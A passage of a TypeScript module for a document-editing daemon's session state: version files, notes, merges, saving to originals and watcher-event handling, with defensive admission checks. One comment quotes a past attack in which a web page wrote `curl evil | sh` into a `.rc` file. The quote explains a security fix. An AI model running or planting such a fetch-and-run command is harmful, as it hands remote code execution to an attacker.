/**
 * The session — the daemon's state, and the only code that writes a file.
 *
 * E8's shape, the house's "materialized path" pattern: the daemon owns the
 * session (context, docs, versions, which is active, the chat) and persists it
 * as `manifest.json`; every version's TEXT is a file in the session folder, so
 * the agent edits versions with its own file tools.
 *
 *     $SCRIPTORIUM_HOME/sessions/<sessionId>/
 *       manifest.json              written atomically, on every change
 *       docs/<slug>/v1.md, v2.md   one file per version
 *
 * The three write rules, each a decision rather than a habit:
 *
 * - **The original is written ONLY by `save`** (E7). Opening copies it to v1;
 *   nothing else touches it.
 * - **Every write this module makes is remembered by content hash** (the
 *   `owned` map) so the watcher can tell the daemon's own writes from anyone
 *   else's (investigation §5). A write to the ACTIVE version that is not ours
 *   is an E2 violation the daemon announces.
 * - **The agent never writes the active version** (E2) — enforced socially by
 *   SKILL.md and detected here, not prevented: the file is the agent's medium.
 *
 * Nothing here knows about sockets, HTTP or the event log. The daemon calls a
 * method, gets a result, and decides what to broadcast; that split is what
 * lets the unit cells drive the whole model with a temp home.
 */

import {
  closeSync,
  existsSync,
  mkdirSync,
  openSync,
  readdirSync,
  readFileSync,
  readSync,
  realpathSync,
  renameSync,
  // ⚠ `rmdirSync` rather than `rmSync(…, {recursive:true})` ON PURPOSE: it
  // throws ENOTEMPTY, which is a second net under `removeCreated`'s own
  // emptiness check. A recursive delete would make the bug it prevents
  // unrecoverable rather than loud.
  rmdirSync,
  rmSync,
  statSync,
  unlinkSync,
  writeFileSync,
} from "node:fs";
import { homedir } from "node:os";
import { basename, dirname, extname, isAbsolute, join, relative, resolve, sep } from "node:path";
import { writeFileAtomic } from "../../kit/wire/discovery.ts";
import { type Anchor, anchorOf, findAnchor } from "./anchors";
import { applyHunks, diffText } from "./diff";
import {
  bodyLineOffset,
  buildBlock,
  guessType,
  matchesFilter,
  readMeta,
  setKey,
  splitFrontmatter,
  summarize,
  titleFromBody,
  withBlock,
} from "./frontmatter";
import { type BundleIndex, buildGraph, type Resolution, resolveTarget } from "./links";
import type {
  ChatMessage,
  ChatWho,
  ContextEntry,
  DiffPayload,
  DiffSide,
  DocMeta,
  DocSummary,
  DocView,
  GraphPayload,
  MetaFilter,
  MovePlan,
  Note,
  PlacedNote,
  PublicState,
  Selection,
  Task,
  Version,
  VersionAuthor,
} from "./protocol";
import { type Candidate, type SearchReport, searchDocuments } from "./search";
import {
  DOC_EXTENSIONS,
  docPaths,
  entryForPath,
  findNode,
  isDocName,
  locate,
  MIRROR_NODE_CAP,
  scanTree,
  toPosix,
} from "./tree";

export const MANIFEST_FORMAT = 1;

/** The most documents one frontmatter scan reads. */
export const META_SCAN_CAP = 500;
/** A frontmatter block lives at the top of a file; this is how much we read to find it. */
const META_HEAD_BYTES = 8192;

/** The first 8 KB of a file, as text — enough for any frontmatter block. */
function readHead(path: string): string {
  let fd: number | undefined;
  try {
    fd = openSync(path, "r");
    const buf = Buffer.alloc(META_HEAD_BYTES);
    const read = readSync(fd, buf, 0, META_HEAD_BYTES, 0);
    return buf.subarray(0, read).toString("utf8");
  } catch {
    return "";
  } finally {
    if (fd !== undefined) closeSync(fd);
  }
}

type DocRecord = {
  slug: string;
  name: string;
  original: string;
  entryId: string | null;
  rel: string | null;
  ext: string;
  versions: Omit<Version, "path">[];
  active: number;
  /**
   * The next version number to hand out — MONOTONIC, and never derived from
   * the versions still present (E41). Numbering as `max(existing) + 1` was
   * correct while nothing could be deleted; the moment a version can be
   * removed, deleting the highest makes the next one REUSE its number, and a
   * `v3` named in a chat message, a log line or an agent's notes would then
   * point at a different document. Absent on a manifest written before E41 —
   * `takeVersion` derives it once, from the highest that ever was.
   */
  nextVersion?: number;
  /** Notes on this document (E45). Stored in the manifest: they travel with the
   *  session and never litter the human's folder. */
  notes?: Note[];
  /** Hash of the original as we last read or wrote it — at open, save, revert
   *  and reload — so a restore can tell that it changed while no daemon was
   *  watching (verify-pass fix 2). */
  originalHash: string;
  /** Set only by `openPath`, which admits a doc-type file INSIDE a context
   *  entry. `save` writes no original that lacks it (verify-pass fix 1c). */
  admitted?: boolean;
  outsideChanged: boolean;
};

export type Manifest = {
  format: number;
  sessionId: string;
  createdAt: number;
  context: ContextEntry[];
  docs: DocRecord[];
  openDoc: string | null;
  chat: ChatMessage[];
  /** The work queue (E50). Absent in a manifest written before it existed. */
  tasks?: Task[];
  /** E23's workspace. Absent in a manifest written before it existed: the user's home. */
  workspace?: string;
};

/** A refusal the daemon turns into an HTTP status — `choices` when the set is in hand (A1). */
export class SessionError extends Error {
  constructor(
    message: string,
    readonly status: 400 | 404 | 409,
    readonly choices?: string[],
  ) {
    super(message);
  }
}

export const contentHash = (text: string): string => Bun.hash(text).toString(16);

const randHex = (n: number) =>
  Array.from(crypto.getRandomValues(new Uint8Array(n)))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");

export const newSessionId = (): string => randHex(4);

/** A path's realpath, or the path itself when it cannot be resolved (gone). */
export function realOr(p: string): string {
  try {
    return realpathSync(p);
  } catch {
    return p;
  }
}

/** What a watcher event turned out to be. `null` = nothing (ours, or no change). */
export type FileEvent =
  | { kind: "version.changed"; doc: string; version: number; text: string; active: false }
  | {
      kind: "active.outside";
      doc: string;
      version: number;
      path: string;
      /** The new agent version the outside text was preserved as. */
      preservedAs: number;
      preservedPath: string;
    }
  | { kind: "version.created"; doc: string; version: number; path: string }
  | { kind: "original.reloaded"; doc: string; version: number; text: string; original: string }
  | { kind: "original.conflict"; doc: string; original: string }
  | { kind: "tree"; entryId: string };

export class Session {
  readonly dir: string;
  private m: Manifest;
  /** path → hash of the daemon's last write to it. */
  private owned = new Map<string, string>();
  /** slug → hash of the active version's current text. */
  private activeHash = new Map<string, string>();
  /** slug → the active version's text as the daemon last wrote (or adopted)
   *  it — what an outside write to the active version is reverted to. */
  private lastActiveText = new Map<string, string>();
  /** What a restore found changed on disk while no daemon was watching. */
  restoreFindings: { doc: string; original: string; missing: boolean }[] = [];

  private constructor(
    readonly home: string,
    manifest: Manifest,
  ) {
    this.m = manifest;
    this.dir = join(home, "sessions", manifest.sessionId);
  }

  static create(home: string, sessionId: string = newSessionId(), workspace?: string): Session {
    const s = new Session(home, {
      format: MANIFEST_FORMAT,
      sessionId,
      createdAt: Date.now(),
      context: [],
      docs: [],
      openDoc: null,
      chat: [],
      ...(workspace ? { workspace: resolve(workspace) } : {}),
    });
    mkdirSync(join(s.dir, "docs"), { recursive: true });
    s.persist();
    return s;
  }

  /** Reload a session from its manifest (`open --restore <id>`). */
  static restore(home: string, sessionId: string): Session {
    const path = join(home, "sessions", sessionId, "manifest.json");
    if (!existsSync(path)) throw new SessionError(`no saved session ${sessionId}`, 404);
    const m = JSON.parse(readFileSync(path, "utf8")) as Manifest;
    if (m.format !== MANIFEST_FORMAT)
      throw new SessionError(`session ${sessionId} has manifest format ${m.format}`, 409);
    const s = new Session(home, m);
    mkdirSync(join(s.dir, "docs"), { recursive: true });
    // Mirrors are re-read, not trusted: the folder may have changed while no
    // daemon was watching it.
    for (const e of s.m.context) if (e.membership === "mirrored") s.rescan(e.id);
    for (const d of s.m.docs) {
      const p = s.versionPath(d, d.active);
      const text = existsSync(p) ? readFileSync(p, "utf8") : "";
      s.adoptActive(d, text);
      // ⛔ VERIFY-PASS FIX 2: an original changed while the session was closed
      // was invisible here, so the next Save overwrote it unannounced. The
      // manifest holds the original's hash as of the last open/save/revert/
      // reload; a different hash now is an outside change, marked exactly as a
      // live one with a dirty buffer is — asked, never merged or reloaded.
      let now: string | null = null;
      try {
        now = contentHash(readFileSync(d.original, "utf8"));
      } catch {
        now = null;
      }
      if (now === null || now !== d.originalHash) {
        d.outsideChanged = true;
        s.restoreFindings.push({ doc: d.slug, original: d.original, missing: now === null });
      }
    }
    if (s.restoreFindings.length > 0) s.persist();
    return s;
  }

  static listSaved(home: string): string[] {
    try {
      return readdirSync(join(home, "sessions")).filter((id) =>
        existsSync(join(home, "sessions", id, "manifest.json")),
      );
    } catch {
      return [];
    }
  }

  get id(): string {
    return this.m.sessionId;
  }

  get docsDir(): string {
    return join(this.dir, "docs");
  }

  get openDocSlug(): string | null {
    return this.m.openDoc;
  }

  get context(): readonly ContextEntry[] {
    return this.m.context;
  }

  /**
   * Every directory the watcher must see: the session's docs, each entry root,
   * and the REAL directory of every opened original.
   *
   * ⛔ VERIFY-PASS FIX 3: each root is watched at its REALPATH (`watch`), and
   * an event is reported under the path form the session stores (`path`). A
   * watch on a symlinked directory — a symlinked home, a symlinked folder
   * entry — or on the link's own directory for a symlinked original saw
   * nothing when the TARGET changed (FSEvents reports real paths). A symlinked
   * original is matched back to its doc by realpath in `onFileEvent`.
   */
  watchRoots(): { path: string; watch: string; recursive: boolean; entryId?: string }[] {
    const roots: { path: string; watch: string; recursive: boolean; entryId?: string }[] = [
      { path: this.docsDir, watch: realOr(this.docsDir), recursive: true },
    ];
    for (const e of this.m.context)
      roots.push({
        path: e.root,
        watch: realOr(e.root),
        recursive: e.membership === "mirrored",
        entryId: e.id,
      });
    for (const d of this.m.docs) {
      const realDir = dirname(realOr(d.original));
      if (
        !roots.some((r) => r.watch === realDir && r.recursive === false) &&
        !roots.some(
          (r) => r.recursive && (realDir === r.watch || realDir.startsWith(r.watch + sep)),
        )
      )
        roots.push({ path: realDir, watch: realDir, recursive: false });
    }
    return roots;
  }

  // ── persistence ────────────────────────────────────────────────────────

  persist(): void {
    mkdirSync(this.dir, { recursive: true });
    writeFileAtomic(join(this.dir, "manifest.json"), `${JSON.stringify(this.m, null, 2)}\n`);
  }

  private writeOwned(path: string, text: string): void {
    mkdirSync(dirname(path), { recursive: true });
    // Remember BEFORE writing: the watcher's event can arrive before this
    // function returns, and it must find the hash already there.
    this.owned.set(path, contentHash(text));
    writeFileSync(path, text);
  }

  private adoptActive(d: DocRecord, text: string): void {
    const p = this.versionPath(d, d.active);
    this.owned.set(p, contentHash(text));
    this.activeHash.set(d.slug, contentHash(text));
    this.lastActiveText.set(d.slug, text);
  }

  private writeActive(d: DocRecord, text: string): void {
    this.writeOwned(this.versionPath(d, d.active), text);
    this.activeHash.set(d.slug, contentHash(text));
    this.lastActiveText.set(d.slug, text);
  }

  /** Keep an outside write to the active version as a NEW agent version. */
  private preserveOutside(d: DocRecord, text: string): Version {
    const n = this.takeVersion(d);
    const rec: Omit<Version, "path"> = {
      n,
      author: "agent",
      from: d.active,
      createdAt: Date.now(),
      label: `outside write to v${d.active}`,
    };
    d.versions.push(rec);
    this.writeOwned(this.versionPath(d, n), text);
    this.persist();
    return { ...rec, path: this.versionPath(d, n) };
  }

  /** True iff `text` at `path` is exactly what the daemon last wrote there. */
  isOwnWrite(path: string, text: string): boolean {
    return this.owned.get(path) === contentHash(text);
  }

  // ── context ────────────────────────────────────────────────────────────

  addContext(rawPath: string): { entry: ContextEntry; added: boolean } {
    const abs = resolve(rawPath);
    const probe = entryForPath(abs, `c-${randHex(3)}`);
    const same = this.m.context.find(
      (e) =>
        e.root === probe.root &&
        e.membership === probe.membership &&
        (probe.membership === "mirrored" ||
          JSON.stringify(e.nodes) === JSON.stringify(probe.nodes)),
    );
    if (same) return { entry: same, added: false };
    this.m.context.push(probe);
    this.relink();
    this.persist();
    return { entry: probe, added: true };
  }

  /** An entry's root path, so E60 can put back a context entry it removed. */
  entryRoot(id: string): string | null {
    return this.m.context.find((e) => e.id === id)?.root ?? null;
  }

  removeContext(id: string): void {
    const i = this.m.context.findIndex((e) => e.id === id);
    if (i < 0)
      throw new SessionError(
        `no context entry ${id}`,
        404,
        this.m.context.map((e) => e.id),
      );
    this.m.context.splice(i, 1);
    this.relink();
    this.closeOrphanedOpenDoc();
    this.persist();
  }

  /**
   * The open document left the context (its entry removed, or the document
   * hidden): close it in the view. Its versions stay in the session — nothing
   * is deleted — and bringing it back and opening it again finds them.
   */
  private closeOrphanedOpenDoc(): void {
    const open = this.m.openDoc ? this.m.docs.find((d) => d.slug === this.m.openDoc) : undefined;
    if (open && open.entryId === null) this.m.openDoc = null;
  }

  /** Re-mirror a folder entry. Returns whether its nodes changed. */
  rescan(entryId: string): boolean {
    const e = this.m.context.find((x) => x.id === entryId);
    if (e?.membership !== "mirrored") return false;
    const { nodes, truncated } = scanTree(e.root, MIRROR_NODE_CAP, e.hidden);
    const changed =
      JSON.stringify(nodes) !== JSON.stringify(e.nodes) || !!truncated !== !!e.truncated;
    e.nodes = nodes;
    if (truncated) e.truncated = true;
    else delete e.truncated;
    if (changed) this.relink();
    return changed;
  }

  private relink(): void {
    for (const d of this.m.docs) {
      const at = locate(this.m.context, d.original);
      d.entryId = at?.entryId ?? null;
      d.rel = at?.rel ?? null;
    }
  }

  // ── documents and versions ─────────────────────────────────────────────

  private versionPath(d: DocRecord, n: number): string {
    return join(this.docsDir, d.slug, `v${n}${d.ext}`);
  }

  private docOrDie(slug?: string): DocRecord {
    const want = slug ?? this.m.openDoc ?? undefined;
    const choices = this.m.docs.map((d) => d.slug);
    if (want === undefined)
      throw new SessionError("no document is open — name one with --doc", 409, choices);
    const d = this.findDoc(want);
    if (!d) throw new SessionError(`no document "${want}" in this session`, 404, choices);
    return d;
  }

  /** A doc by slug, by original path, or by a unique original basename. */
  findDoc(key: string): DocRecord | undefined {
    const bySlug = this.m.docs.find((d) => d.slug === key);
    if (bySlug) return bySlug;
    // ⛔ ONLY AN ABSOLUTE key is a path (verify-pass fix 8): resolving a
    // relative one here resolved it against the DAEMON's cwd. The CLI resolves
    // against its own cwd and sends an absolute path.
    if (isAbsolute(key)) {
      const byPath = this.m.docs.find(
        (d) => d.original === key || realOr(d.original) === realOr(key),
      );
      if (byPath) return byPath;
    }
    const byName = this.m.docs.filter((d) => basename(d.original) === key || d.rel === key);
    return byName.length === 1 ? byName[0] : undefined;
  }

  /** The next version number, consumed. Numbers are never reused (E41). */
  private takeVersion(d: DocRecord): number {
    const n = d.nextVersion ?? Math.max(...d.versions.map((v) => v.n)) + 1;
    d.nextVersion = n + 1;
    return n;
  }

  private versionOrDie(d: DocRecord, n: number): Omit<Version, "path"> {
    const v = d.versions.find((x) => x.n === n);
    if (!v)
      throw new SessionError(
        `${d.slug} has no v${n}`,
        404,
        d.versions.map((x) => `v${x.n}`),
      );
    return v;
  }

  private slugFor(original: string): string {
    const stem =
      basename(original, extname(original))
        .toLowerCase()
        .replace(/[^a-z0-9_-]+/g, "-")
        .replace(/^-+|-+$/g, "") || "doc";
    let slug = stem;
    for (let i = 2; this.m.docs.some((d) => d.slug === slug); i++) slug = `${stem}-${i}`;
    return slug;
  }

  /**
   * Open a document by its original's path: v1 is written from the original
   * the first time. `focus: false` (the agent's implicit open through
   * `version-new --doc <path>`) does not move the human's open document.
   *
   * ⛔ VERIFY-PASS FIX 1b — ADMISSION. Only a doc-type file INSIDE a context
   * entry is admitted; `context.add` stays the one way in. Before this, any
   * path of any type was opened, and Save then wrote it: a foreign web page
   * wrote `curl evil | sh` into a `.rc` file outside the context.
   */
  openPath(rawPath: string, opts: { focus?: boolean } = {}): { slug: string; created: boolean } {
    const focus = opts.focus ?? true;
    // The context's own spelling of the path: a caller whose cwd is a realpath
    // (/private/var/… for /var/…, or through a symlinked folder) names the same
    // file differently, and it must land on the same doc.
    const abs = this.canonical(resolve(rawPath));
    const existing = this.m.docs.find((d) => d.original === abs);
    if (existing) {
      if (focus) this.m.openDoc = existing.slug;
      this.persist();
      return { slug: existing.slug, created: false };
    }
    if (!isDocName(abs)) throw new SessionError(`not a document scriptorium opens: ${abs}`, 400);
    if (!locate(this.m.context, abs))
      throw new SessionError(
        `${abs} is not in this session's context — add it (or its folder) first`,
        400,
      );
    let text: string;
    try {
      if (!statSync(abs).isFile()) throw new Error("not a file");
      text = readFileSync(abs, "utf8");
    } catch {
      throw new SessionError(`cannot open ${abs}: no such file`, 404);
    }
    const ext = [".md", ".markdown", ".mdx", ".txt"].includes(extname(abs).toLowerCase())
      ? extname(abs).toLowerCase()
      : ".md";
    const at = locate(this.m.context, abs);
    const d: DocRecord = {
      slug: this.slugFor(abs),
      name: basename(abs),
      original: abs,
      entryId: at?.entryId ?? null,
      rel: at?.rel ?? null,
      ext,
      versions: [{ n: 1, author: "human", createdAt: Date.now() }],
      active: 1,
      originalHash: contentHash(text),
      outsideChanged: false,
      admitted: true,
    };
    this.m.docs.push(d);
    this.writeActive(d, text);
    if (focus) this.m.openDoc = d.slug;
    this.persist();
    return { slug: d.slug, created: true };
  }

  /** `abs` as the context spells it, when it is the same file by realpath. */
  private canonical(abs: string): string {
    if (locate(this.m.context, abs)) return abs;
    const real = realOr(abs);
    for (const e of this.m.context) {
      const realRoot = realOr(e.root);
      if (!real.startsWith(realRoot + sep)) continue;
      const spelled = join(e.root, relative(realRoot, real));
      if (locate(this.m.context, spelled)) return spelled;
    }
    return abs;
  }

  openSlug(slug: string): void {
    this.m.openDoc = this.docOrDie(slug).slug;
    this.persist();
  }

  readVersion(slug: string, n: number): { text: string; path: string } {
    const d = this.docOrDie(slug);
    this.versionOrDie(d, n);
    const path = this.versionPath(d, n);
    return { text: readFileSync(path, "utf8"), path };
  }

  activePath(slug?: string): string | null {
    const d = slug ? this.findDoc(slug) : this.m.openDoc ? this.findDoc(this.m.openDoc) : undefined;
    return d ? this.versionPath(d, d.active) : null;
  }

  /** The human's buffer reaches the ACTIVE version's file (debounced by the surface). */
  /**
   * ⛔ VERIFY-PASS FIX 4 — CHECK BEFORE WRITE. Before the human's edit is
   * written, the file on disk is hashed: if it is not the daemon's own last
   * write, someone else wrote the active version (E2). That text is kept as a
   * NEW agent version, and only then is the edit written. Detection used to
   * depend on the watcher's 60 ms settle timer firing before the next
   * keystroke; a burst of edits at 30 ms clobbered an outside write
   * unannounced. Now nothing is lost whatever the timing — the one window left
   * is the microseconds between this read and this write.
   */
  edit(
    slug: string,
    n: number,
    text: string,
  ): { dirtyChanged: boolean; preserved: Version | null } {
    const d = this.docOrDie(slug);
    if (n !== d.active)
      throw new SessionError(
        `v${n} is not the active version of ${d.slug} (v${d.active} is) — only the active version is editable`,
        409,
      );
    const before = this.isDirty(d);
    const path = this.versionPath(d, n);
    // The edit is staged in a sibling file FIRST, so the check below and the
    // rename that lands the edit are adjacent syscalls: the window in which an
    // outside write could slip between them is microseconds, not the length of
    // a multi-megabyte write — and a write landing AFTER the rename goes to the
    // new file, where the watcher finds it and preserves it too.
    const staged = `${path}.${process.pid}.edit`;
    writeFileSync(staged, text);
    let preserved: Version | null = null;
    let onDisk: string | null = null;
    try {
      onDisk = readFileSync(path, "utf8");
    } catch {
      onDisk = null;
    }
    if (onDisk !== null && !this.isOwnWrite(path, onDisk))
      preserved = this.preserveOutside(d, onDisk);
    this.owned.set(path, contentHash(text));
    renameSync(staged, path);
    this.activeHash.set(d.slug, contentHash(text));
    this.lastActiveText.set(d.slug, text);
    return { dirtyChanged: before !== this.isDirty(d), preserved };
  }

  /** Copy a version to a new file; the agent then edits that file with its own tools. */
  newVersion(opts: { doc?: string; from?: number; label?: string; author: VersionAuthor }): {
    slug: string;
    version: Version;
  } {
    const d = this.docOrDie(opts.doc);
    const from = opts.from ?? d.active;
    this.versionOrDie(d, from);
    const text = readFileSync(this.versionPath(d, from), "utf8");
    const n = this.takeVersion(d);
    const rec: Omit<Version, "path"> = {
      n,
      author: opts.author,
      from,
      createdAt: Date.now(),
      ...(opts.label ? { label: opts.label } : {}),
    };
    d.versions.push(rec);
    this.writeOwned(this.versionPath(d, n), text);
    this.persist();
    return { slug: d.slug, version: { ...rec, path: this.versionPath(d, n) } };
  }

  /**
   * Remove a version and its file (E41).
   *
   * ⛔ THE ACTIVE VERSION CANNOT BE DELETED, and refusing is better than
   * picking a replacement: choosing one for the human would silently move
   * where their edits and Save are pointed, which is the one thing E2 and E7
   * exist to keep explicit. Because exactly one version is always active, this
   * also means the last version can never be deleted — a document always has
   * something to edit, without that being a second rule.
   *
   * `from` pointers on OTHER versions are left as they are. "Made from v2"
   * stays true after v2 is gone; deleting a version is not rewriting the
   * history of the ones that remain.
   */
  deleteVersion(opts: { doc?: string; version: number }): {
    slug: string;
    version: number;
    label?: string;
    remaining: number;
  } {
    const d = this.docOrDie(opts.doc);
    const v = this.versionOrDie(d, opts.version);
    if (opts.version === d.active)
      throw new SessionError(
        `v${opts.version} is the active version of ${d.slug} — activate another one first, ` +
          `then delete this`,
        409,
      );
    // ⛔ MATERIALISE THE COUNTER BEFORE REMOVING THE RECORD. `takeVersion`
    // derives it lazily from the versions PRESENT, so on a doc that has never
    // allocated one (a manifest written before E41, restored) deleting the
    // highest would let the next allocation derive the same number again. Found
    // by driving it, not by the unit test above — which allocated first and so
    // never had a cold counter.
    d.nextVersion ??= Math.max(...d.versions.map((x) => x.n)) + 1;
    const path = this.versionPath(d, opts.version);
    d.versions = d.versions.filter((x) => x.n !== opts.version);
    try {
      rmSync(path);
    } catch {
      // The record is what the session believes; a file already gone (a hand
      // tidy, a crash between write and record) must not block removing it.
    }
    this.owned.delete(path);
    this.persist();
    return {
      slug: d.slug,
      version: opts.version,
      ...(v.label ? { label: v.label } : {}),
      remaining: d.versions.length,
    };
  }

  activate(opts: { doc?: string; version: number }): { slug: string; previous: number } {
    const d = this.docOrDie(opts.doc);
    this.versionOrDie(d, opts.version);
    const previous = d.active;
    d.active = opts.version;
    // The new active version's text AS IT IS NOW is the baseline the next
    // check-before-write compares against.
    this.adoptActive(d, readFileSync(this.versionPath(d, d.active), "utf8"));
    this.persist();
    return { slug: d.slug, previous };
  }

  // ── comparing and merging (E36) ────────────────────────────────────────────

  /**
   * The text of one side of a comparison. `"original"` is read from DISK, not
   * from a cache: the whole point of comparing against it is to see what the
   * file of record actually says right now, including a change someone else
   * made while this session was open.
   */
  private sideText(d: DocRecord, side: DiffSide): string {
    if (side === "original") return readFileSync(d.original, "utf8");
    this.versionOrDie(d, side);
    return readFileSync(this.versionPath(d, side), "utf8");
  }

  /** Compare the ACTIVE version (left) against another side (right). */
  compare(opts: { doc?: string; against: DiffSide }): DiffPayload {
    const d = this.docOrDie(opts.doc);
    if (opts.against === d.active)
      throw new SessionError(
        `v${d.active} is the active version of ${d.slug} — comparing it with itself says nothing`,
        400,
      );
    const left = readFileSync(this.versionPath(d, d.active), "utf8");
    return {
      doc: d.slug,
      active: d.active,
      against: opts.against,
      diff: diffText(left, this.sideText(d, opts.against)),
    };
  }

  /**
   * Take named hunks from `against` into the active version.
   *
   * ⛔ THE WRITE GOES THROUGH `edit`, which is what makes a merge obey every
   * rule an ordinary keystroke obeys: it lands on the active version and never
   * the original (E7), and check-before-write preserves an outside write as a
   * new version first (E2). A merge writing the file directly would be the one
   * path into the document that could silently clobber the agent.
   */
  merge(opts: { doc?: string; against: DiffSide; hunks: number[] }): {
    slug: string;
    version: number;
    text: string;
    applied: number;
    preserved: Version | null;
  } {
    const d = this.docOrDie(opts.doc);
    const payload = this.compare({ doc: d.slug, against: opts.against });
    const known = new Set(payload.diff.hunks.map((h) => h.id));
    const missing = opts.hunks.filter((id) => !known.has(id));
    if (missing.length)
      throw new SessionError(
        `${d.slug} has no hunk ${missing.join(", ")} against ${sideName(opts.against, d.name)} — ` +
          `it has ${known.size === 0 ? "none" : `1..${Math.max(...known)}`}. Run diff again: ` +
          `the text changed under the numbers.`,
        409,
      );
    const before = readFileSync(this.versionPath(d, d.active), "utf8");
    const text = applyHunks(before, payload.diff.hunks, opts.hunks);
    const { preserved } = this.edit(d.slug, d.active, text);
    return {
      slug: d.slug,
      version: d.active,
      text,
      applied: opts.hunks.filter((id) => known.has(id)).length,
      preserved,
    };
  }

  // ── notes (E45) ────────────────────────────────────────────────────────────

  /** The active version's text — what every note is anchored against. */
  private activeText(d: DocRecord): string {
    return readFileSync(this.versionPath(d, d.active), "utf8");
  }

  /** Place every note in the active text as it stands now. */
  private placedNotes(d: DocRecord): PlacedNote[] {
    const notes = d.notes ?? [];
    if (notes.length === 0) return [];
    const text = this.activeText(d);
    return notes.map((n) => ({ ...n, ...findAnchor(text, n) }));
  }

  /**
   * Note a range of the active version's text (the human selects) or a quote
   * found in it (the agent quotes — it has no offsets).
   */
  addNote(opts: {
    doc?: string;
    body: string;
    who: VersionAuthor;
    range?: { from: number; to: number };
    quote?: string;
  }): { slug: string; note: Note; how: "selection" | "quote" } {
    const d = this.docOrDie(opts.doc);
    const body = opts.body.trim();
    if (!body) throw new SessionError("a note needs something written in it", 400);
    const text = this.activeText(d);

    let anchor: Anchor;
    if (opts.range) {
      const { from, to } = opts.range;
      if (from < 0 || to > text.length || from >= to)
        throw new SessionError(
          `${from}..${to} is not a range in v${d.active} of ${d.slug} (${text.length} characters)`,
          400,
        );
      anchor = anchorOf(text, from, to);
    } else {
      const quote = opts.quote ?? "";
      if (!quote) throw new SessionError("a note needs a selection or a quote", 400);
      const at = text.indexOf(quote);
      // ⛔ REFUSED, not anchored hopefully. A quote the active version does not
      // contain would become an orphan the moment it was made, which reads as
      // "the text changed" when the truth is "you quoted something else".
      if (at === -1)
        throw new SessionError(
          `v${d.active} of ${d.slug} does not contain that text — quote it exactly as it appears`,
          404,
        );
      anchor = anchorOf(text, at, at + quote.length);
    }

    const note: Note = {
      id: `n${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`,
      version: d.active,
      ...anchor,
      body,
      who: opts.who,
      createdAt: Date.now(),
      resolved: false,
    };
    d.notes = [...(d.notes ?? []), note];
    this.persist();
    return { slug: d.slug, note, how: opts.range ? "selection" : "quote" };
  }

  /** Notes on a document, placed — `all` includes the resolved ones. */
  notesOf(opts: { doc?: string; all?: boolean }): { slug: string; notes: PlacedNote[] } {
    const d = this.docOrDie(opts.doc);
    const placed = this.placedNotes(d);
    return { slug: d.slug, notes: opts.all ? placed : placed.filter((n) => !n.resolved) };
  }

  private noteOrDie(d: DocRecord, id: string): Note {
    const note = (d.notes ?? []).find((n) => n.id === id);
    if (!note)
      throw new SessionError(
        `${d.slug} has no note ${id}`,
        404,
        (d.notes ?? []).map((n) => n.id),
      );
    return note;
  }

  /** Change what a note SAYS. Its anchor is untouched — it is still about the
   *  same passage, which is why editing does not re-quote (E46). */
  editNote(opts: { doc?: string; id: string; body: string }): { slug: string; note: Note } {
    const d = this.docOrDie(opts.doc);
    const note = this.noteOrDie(d, opts.id);
    const body = opts.body.trim();
    if (!body) throw new SessionError("a note needs something written in it", 400);
    note.body = body;
    note.editedAt = Date.now();
    this.persist();
    return { slug: d.slug, note };
  }

  resolveNote(opts: { doc?: string; id: string; resolved: boolean }): {
    slug: string;
    note: Note;
  } {
    const d = this.docOrDie(opts.doc);
    const note = this.noteOrDie(d, opts.id);
    note.resolved = opts.resolved;
    this.persist();
    return { slug: d.slug, note };
  }

  removeNote(opts: { doc?: string; id: string }): { slug: string; note: Note } {
    const d = this.docOrDie(opts.doc);
    const note = this.noteOrDie(d, opts.id);
    d.notes = (d.notes ?? []).filter((n) => n.id !== opts.id);
    this.persist();
    return { slug: d.slug, note };
  }

  /** Save: the active version's text over the original. The ONLY write to it (E7). */
  save(slug: string): { original: string; version: number } {
    const d = this.docOrDie(slug);
    // ⛔ VERIFY-PASS FIX 1c: Save writes only an original admitted by
    // `openPath` (a doc-type file inside a context entry). Checked again here
    // so no other path into the manifest — a hand-edited one, a future verb —
    // can turn Save into "write any file".
    if (!d.admitted || !isDocName(d.original))
      throw new SessionError(
        `refusing to save ${d.original}: it was not opened from the context`,
        409,
      );
    const text = readFileSync(this.versionPath(d, d.active), "utf8");
    this.writeOwned(d.original, text);
    d.originalHash = contentHash(text);
    d.outsideChanged = false;
    this.persist();
    return { original: d.original, version: d.active };
  }

  /** Revert: the original's text back over the active version. */
  revert(slug: string): { version: number; text: string } {
    const d = this.docOrDie(slug);
    const text = readFileSync(d.original, "utf8");
    d.originalHash = contentHash(text);
    d.outsideChanged = false;
    this.writeActive(d, text);
    this.persist();
    return { version: d.active, text };
  }

  private isDirty(d: DocRecord): boolean {
    return (this.activeHash.get(d.slug) ?? "") !== d.originalHash;
  }

  // ── the watcher's question: whose write was that? ───────────────────────

  /**
   * Classify one filesystem event. Reads the file; returns `null` when it is
   * the daemon's own write, unchanged, gone, or not ours to care about.
   */
  onFileEvent(abs: string): FileEvent | null {
    // A version file under docs/<slug>/vN.ext?
    if (abs.startsWith(this.docsDir + sep)) {
      const rest = abs.slice(this.docsDir.length + 1).split(sep);
      if (rest.length !== 2) return null;
      const [slug, file] = rest as [string, string];
      const d = this.m.docs.find((x) => x.slug === slug);
      const match = /^v(\d+)(\.[a-z]+)$/.exec(file);
      if (!d || !match || match[2] !== d.ext) return null;
      const n = Number(match[1]);
      let text: string;
      try {
        text = readFileSync(abs, "utf8");
      } catch {
        return null;
      }
      if (this.isOwnWrite(abs, text)) return null;
      if (!d.versions.some((v) => v.n === n)) {
        // The agent wrote a version file by hand rather than through
        // `version-new` — adopt it rather than leave a file the surface cannot see.
        d.versions.push({ n, author: "agent", createdAt: Date.now() });
        d.versions.sort((a, b) => a.n - b.n);
        this.owned.set(abs, contentHash(text));
        this.persist();
        return { kind: "version.created", doc: d.slug, version: n, path: abs };
      }
      if (n === d.active) {
        // E2, refused and RE-LABELLED: the outside text becomes a new agent
        // version, and the active version goes back to the daemon's own last
        // text — so the active version only ever holds what the human typed,
        // and nothing anyone wrote is lost (verify-pass fix 4, watcher half).
        const kept = this.preserveOutside(d, text);
        this.writeActive(d, this.lastActiveText.get(d.slug) ?? text);
        return {
          kind: "active.outside",
          doc: d.slug,
          version: n,
          path: abs,
          preservedAs: kept.n,
          preservedPath: kept.path,
        };
      }
      this.owned.set(abs, contentHash(text));
      return { kind: "version.changed", doc: d.slug, version: n, text, active: false };
    }

    // An opened original — by its stored path, or by realpath for a symlink?
    const d = this.m.docs.find((x) => x.original === abs || realOr(x.original) === abs);
    if (d) {
      let text: string;
      try {
